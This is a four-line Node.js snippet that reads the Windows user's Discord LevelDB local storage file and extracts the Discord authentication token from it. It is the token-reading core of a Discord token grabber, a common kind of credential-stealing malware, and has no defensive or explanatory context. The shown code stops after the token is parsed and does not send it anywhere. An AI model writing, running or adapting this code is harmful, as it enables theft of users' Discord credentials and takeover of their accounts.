let fs = require('fs')
let username = require('os').userInfo().username
let token = fs.readFileSync(`C:/Users/${username}/AppData/Roaming/discord/Local Storage/leveldb/000005.ldb`,'utf8')
token = token.split('>oken')[1].split('\"')[1]
